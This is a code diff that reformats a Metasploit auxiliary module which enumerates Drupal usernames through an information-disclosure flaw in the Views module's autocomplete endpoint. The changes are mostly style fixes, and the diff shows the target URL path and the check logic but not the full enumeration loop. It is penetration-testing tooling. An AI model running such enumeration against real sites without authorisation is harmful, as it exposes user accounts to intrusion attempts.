@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanServer
   include Msf::Auxiliary::Report
@@ -14,45 +14,43 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Drupal Views Module Users Enumeration',
-      'Description'    => %q{
-        This module exploits an information disclosure vulnerability in the 'Views'
-        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'
-      },
-      'Author'         =>
-        [
-          'Justin Klein Keane', #Original Discovery
-          'Robin Francois <rof[at]navixia.com>',
-          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['URL', 'http://www.madirish.net/node/465'],
-        ],
-      'DisclosureDate' => 'Jul 2 2010'
-    ))
+                      'Name'           => 'Drupal Views Module Users Enumeration',
+                      'Description'    => %q(
+                        This module exploits an information disclosure vulnerability in the 'Views'
+                        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'
+                      ),
+                      'Author'         =>
+                        [
+                          'Justin Klein Keane', # Original Discovery
+                          'Robin Francois <rof[at]navixia.com>',
+                          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          ['URL', 'http://www.madirish.net/node/465']
+                        ],
+                      'DisclosureDate' => 'Jul 2 2010'))
 
     register_options(
       [
         OptString.new('TARGETURI', [true, "Drupal Path", "/"])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def base_uri
     @base_uri ||= "#{normalize_uri(target_uri.path)}?q=admin/views/ajax/autocomplete/user/"
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     res = send_request_cgi(
       'uri'     => base_uri,
       'method'  => 'GET',
       'headers' => { 'Connection' => 'Close' }
     )
 
-    unless res
-      return Exploit::CheckCode::Unknown
-    end
+    return Exploit::CheckCode::Unknown unless res
 
     if res.body.include?('Access denied')
       # This probably means the Views Module actually isn't installed
@@ -139,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     end
 
-    results = results * "\n"
+    results *= "\n"
     p = store_loot(
       'drupal_user',
       'text/plain',
@@ -149,5 +147,4 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_status("Usernames stored in: #{p}")
   end
-
 end
